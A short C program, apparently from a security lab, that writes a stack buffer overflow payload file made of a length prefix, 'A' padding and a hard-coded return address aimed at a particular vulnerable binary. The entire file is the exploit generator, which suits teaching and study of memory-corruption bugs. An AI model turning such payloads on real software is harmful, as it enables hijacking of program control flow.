#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define MAX 10


int main(int argc, char **argv)
{
    char *msg = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    int fd;
    int msg_len;
    unsigned int written_bytes;
    unsigned int   return_addr = 0x5655626d;

    if (argc != 2) {
        printf("USAGE: %s <file_name>\n", argv[0]);
        exit(1);
    }

    unlink(argv[1]);
    fd = creat(argv[1], 0644);
    if (fd < 0) {
        perror("Cannot create file");
        exit(2);
    }

    msg_len = strlen(msg) + sizeof(return_addr);
    if (write(fd, &msg_len, sizeof(msg_len)) != sizeof(msg_len)) {
        perror("Cannot write msg len into file");
        exit(3);
    }

    if ((written_bytes = write(fd, msg, strlen(msg))) < 0) {
        perror("Cannot write msg into file");
        exit(4);
    }

    if ((written_bytes = write(fd,&return_addr, sizeof(return_addr))) < 0) {
        perror("Cannot write msg into file");
        exit(4);
    }

    return 0;
}